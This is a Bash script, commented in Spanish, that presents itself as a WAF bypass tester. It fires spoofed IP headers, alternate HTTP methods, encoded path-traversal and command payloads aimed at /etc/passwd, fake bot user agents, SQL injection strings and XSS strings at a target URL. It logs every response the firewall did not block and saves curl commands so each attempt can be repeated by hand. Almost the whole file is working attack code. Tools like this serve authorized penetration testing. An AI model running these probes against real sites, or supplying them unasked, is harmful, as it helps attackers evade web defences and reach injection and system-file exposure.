
#!/bin/bash
# Script de bypass WAF en Bash Shell 1.0.x
# Incluye comandos curl completos para reproducción manual

# Colores para la salida
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Configuración
URL="${1:-http://localhost}"
OUTPUT_FILE="wafbypass_results.txt"
CURL_COMMANDS_FILE="curl_commands.txt"

# Limpiar archivos anteriores
> "$OUTPUT_FILE"
> "$CURL_COMMANDS_FILE"

# Función para realizar prueba y guardar comando curl
test_and_save() {
    local test_name="$1"
    local test_url="$2"
    local test_data="$3"
    local method="$4"
    
    echo -e "\n${YELLOW}=== Probando: $test_name ===${NC}"
    echo "URL: $test_url"
    
    # Construir comando curl
    local curl_cmd="curl -X $method"
    
    if [ -n "$test_data" ]; then
        curl_cmd="$curl_cmd -d \"$test_data\""
    fi
    
    curl_cmd="$curl_cmd \"$test_url\""
    
    # Guardar comando curl
    echo "# $test_name" >> "$CURL_COMMANDS_FILE"
    echo "$curl_cmd" >> "$CURL_COMMANDS_FILE"
    echo "" >> "$CURL_COMMANDS_FILE"
    
    # Ejecutar prueba
    response=$(curl -s -X "$method" -d "$test_data" "$test_url" -w "%{http_code}")
    status_code=${response: -3}
    
    if [ "$status_code" != "403" ] && [ "$status_code" != "400" ] && [ "$status_code" != "406" ]; then
        echo -e "${GREEN}[+] POSIBLE BYPASS${NC} - Código: $status_code"
        echo "[+] $test_name - Código: $status_code - URL: $test_url" >> "$OUTPUT_FILE"
    else
        echo -e "${RED}[-] Bloqueado${NC} - Código: $status_code"
    fi
}

# Encabezados maliciosos
test_headers() {
    echo -e "\n${YELLOW}=== Probando Headers ===${NC}"
    
    headers=(
        "X-Forwarded-For: 127.0.0.1"
        "X-Real-IP: 127.0.0.1"
        "X-Originating-IP: 127.0.0.1"
        "X-Remote-IP: 127.0.0.1"
        "X-Remote-Addr: 127.0.0.1"
        "X-Client-IP: 127.0.0.1"
        "X-Host: 127.0.0.1"
    )
    
    for header in "${headers[@]}"; do
        header_name=$(echo "$header" | cut -d: -f1)
        echo -e "\n${YELLOW}Probando header: $header_name${NC}"
        
        # Comando curl
        curl_cmd="curl -X GET -H \"$header\" \"$URL\""
        
        # Guardar comando
        echo "# Header: $header_name" >> "$CURL_COMMANDS_FILE"
        echo "$curl_cmd" >> "$CURL_COMMANDS_FILE"
        echo "" >> "$CURL_COMMANDS_FILE"
        
        # Ejecutar
        response=$(curl -s -X GET -H "$header" "$URL" -w "%{http_code}")
        status_code=${response: -3}
        
        if [ "$status_code" != "403" ] && [ "$status_code" != "400" ]; then
            echo -e "${GREEN}[+] POSIBLE BYPASS${NC} - Código: $status_code"
            echo "[+] Header: $header_name - Código: $status_code" >> "$OUTPUT_FILE"
        fi
    done
}

# Métodos HTTP alternativos
test_methods() {
    echo -e "\n${YELLOW}=== Probando Métodos HTTP ===${NC}"
    
    methods=("POST" "PUT" "DELETE" "PATCH" "OPTIONS" "TRACE" "CONNECT")
    
    for method in "${methods[@]}"; do
        echo -e "\n${YELLOW}Probando método: $method${NC}"
        
        # Comando curl
        curl_cmd="curl -X $method \"$URL\""
        
        # Guardar comando
        echo "# Método: $method" >> "$CURL_COMMANDS_FILE"
        echo "$curl_cmd" >> "$CURL_COMMANDS_FILE"
        echo "" >> "$CURL_COMMANDS_FILE"
        
        # Ejecutar
        response=$(curl -s -X "$method" "$URL" -w "%{http_code}")
        status_code=${response: -3}
        
        if [ "$status_code" != "403" ] && [ "$status_code" != "405" ]; then
            echo -e "${GREEN}[+] POSIBLE BYPASS${NC} - Código: $status_code"
            echo "[+] Método: $method - Código: $status_code" >> "$OUTPUT_FILE"
        fi
    done
}

# Bypass mediante codificación
test_encoding() {
    echo -e "\n${YELLOW}=== Probando Codificaciones ===${NC}"
    
    payloads=(
        "/etc/passwd"
        "/../../../../etc/passwd"
        "cat /etc/passwd"
        "id"
        "uname -a"
    )
    
    for payload in "${payloads[@]}"; do
        # URL encode
        url_encoded=$(echo "$payload" | sed 's/ /%20/g' | sed 's/\//%2F/g')
        
        # Double URL encode
        double_encoded=$(echo "$url_encoded" | sed 's/%/%25/g')
        
        # Hex encode
        hex_encoded=$(echo -n "$payload" | xxd -ps -c 256 | sed 's/\(..\)/%\1/g')
        
        tests=(
            "URL Encode: $url_encoded"
            "Double URL Encode: $double_encoded"
            "Hex Encode: $hex_encoded"
        )
        
        for test_case in "${tests[@]}"; do
            encoding_type=$(echo "$test_case" | cut -d: -f1)
            encoded_payload=$(echo "$test_case" | cut -d: -f2-)
            
            test_url="$URL/${encoded_payload# }"
            
            # Comando curl
            curl_cmd="curl -X GET \"$test_url\""
            
            # Guardar comando
            echo "# Payload: $payload - $encoding_type" >> "$CURL_COMMANDS_FILE"
            echo "$curl_cmd" >> "$CURL_COMMANDS_FILE"
            echo "" >> "$CURL_COMMANDS_FILE"
            
            # Ejecutar
            response=$(curl -s -X GET "$test_url" -w "%{http_code}")
            status_code=${response: -3}
            
            if [ "$status_code" != "403" ] && [ "$status_code" != "400" ]; then
                echo -e "${GREEN}[+] POSIBLE BYPASS${NC} - $encoding_type - Código: $status_code"
                echo "[+] $encoding_type: $payload - Código: $status_code" >> "$OUTPUT_FILE"
            fi
        done
    done
}

# Bypass con caracteres especiales
test_special_chars() {
    echo -e "\n${YELLOW}=== Probando Caracteres Especiales ===${NC}"
    
    special_chars=(
        "/."
        "/.."
        "/;/"
        "/./"
        "//"
        "/~"
        "/?"
        "/#"
        "/%09"
        "/%0a"
        "/%00"
    )
    
    for chars in "${special_chars[@]}"; do
        test_url="$URL$chars"
        
        # Comando curl
        curl_cmd="curl -X GET \"$test_url\""
        
        # Guardar comando
        echo "# Caracteres especiales: $chars" >> "$CURL_COMMANDS_FILE"
        echo "$curl_cmd" >> "$CURL_COMMANDS_FILE"
        echo "" >> "$CURL_COMMANDS_FILE"
        
        # Ejecutar
        response=$(curl -s -X GET "$test_url" -w "%{http_code}")
        status_code=${response: -3}
        
        if [ "$status_code" != "403" ] && [ "$status_code" != "400" ]; then
            echo -e "${GREEN}[+] POSIBLE BYPASS${NC} - Código: $status_code"
            echo "[+] Caracteres: $chars - Código: $status_code" >> "$OUTPUT_FILE"
        fi
    done
}

# Bypass mediante User-Agent
test_user_agents() {
    echo -e "\n${YELLOW}=== Probando User-Agents ===${NC}"
    
    user_agents=(
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
        "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
        "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
        "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)"
        "Twitterbot/1.0"
        "curl/7.68.0"
        ""
    )
    
    for ua in "${user_agents[@]}"; do
        ua_desc=${ua:-"(empty User-Agent)"}
        echo -e "\n${YELLOW}Probando User-Agent: $ua_desc${NC}"
        
        # Comando curl
        if [ -n "$ua" ]; then
            curl_cmd="curl -X GET -A \"$ua\" \"$URL\""
        else
            curl_cmd="curl -X GET -H \"User-Agent:\" \"$URL\""
        fi
        
        # Guardar comando
        echo "# User-Agent: $ua_desc" >> "$CURL_COMMANDS_FILE"
        echo "$curl_cmd" >> "$CURL_COMMANDS_FILE"
        echo "" >> "$CURL_COMMANDS_FILE"
        
        # Ejecutar
        if [ -n "$ua" ]; then
            response=$(curl -s -X GET -A "$ua" "$URL" -w "%{http_code}")
        else
            response=$(curl -s -X GET -H "User-Agent:" "$URL" -w "%{http_code}")
        fi
        status_code=${response: -3}
        
        if [ "$status_code" != "403" ] && [ "$status_code" != "400" ]; then
            echo -e "${GREEN}[+] POSIBLE BYPASS${NC} - Código: $status_code"
            echo "[+] User-Agent: $ua_desc - Código: $status_code" >> "$OUTPUT_FILE"
        fi
    done
}

# Pruebas de inyección SQL
test_sql_injection() {
    echo -e "\n${YELLOW}=== Probando Inyección SQL ===${NC}"
    
    sql_payloads=(
        "' OR '1'='1"
        "' OR '1'='1'--"
        "' OR '1'='1'#"
        "' UNION SELECT NULL--"
        "' UNION SELECT NULL,NULL--"
        "admin'--"
        "' OR 1=1--"
    )
    
    for payload in "${sql_payloads[@]}"; do
        # En POST
        test_and_save "SQLi POST: $payload" "$URL" "username=$payload&password=test" "POST"
        
        # En GET
        test_url="$URL?username=$payload&password=test"
        test_and_save "SQLi GET: $payload" "$test_url" "" "GET"
    done
}

# Pruebas XSS
test_xss() {
    echo -e "\n${YELLOW}=== Probando XSS ===${NC}"
    
    xss_payloads=(
        "<script>alert(1)</script>"
        "<img src=x onerror=alert(1)>"
        "\"><script>alert(1)</script>"
        "javascript:alert(1)"
        "onmouseover=alert(1)"
    )
    
    for payload in "${xss_payloads[@]}"; do
        # En POST
        test_and_save "XSS POST: $payload" "$URL" "input=$payload&submit=test" "POST"
        
        # En GET
        test_url="$URL?input=$payload&submit=test"
        test_and_save "XSS GET: $payload" "$test_url" "" "GET"
    done
}

# Main
echo -e "${GREEN}"
echo "=========================================="
echo "       WAF BYPASS TESTER - BASH"
echo "=========================================="
echo -e "${NC}"
echo "URL objetivo: $URL"
echo "Resultados guardados en: $OUTPUT_FILE"
echo "Comandos curl guardados en: $CURL_COMMANDS_FILE"
echo ""

# Ejecutar todas las pruebas
test_headers
test_methods
test_encoding
test_special_chars
test_user_agents
test_sql_injection
test_xss

# Resumen
echo -e "\n${GREEN}"
echo "=========================================="
echo "             PRUEBAS COMPLETADAS"
echo "=========================================="
echo -e "${NC}"

if [ -s "$OUTPUT_FILE" ]; then
    echo -e "${YELLOW}[!] Posibles bypass encontrados:${NC}"
    cat "$OUTPUT_FILE"
    echo ""
    echo -e "${YELLOW}[!] Comandos curl guardados en: $CURL_COMMANDS_FILE${NC}"
    echo "Puedes reproducir manualmente los tests con estos comandos."
else
    echo -e "${RED}[!] No se encontraron posibles bypass${NC}"
fi

echo -e "\n${GREEN}Archivos generados:${NC}"
echo "- $OUTPUT_FILE: Resultados de pruebas exitosas"
echo "- $CURL_COMMANDS_FILE: Comandos curl para reproducción manual"
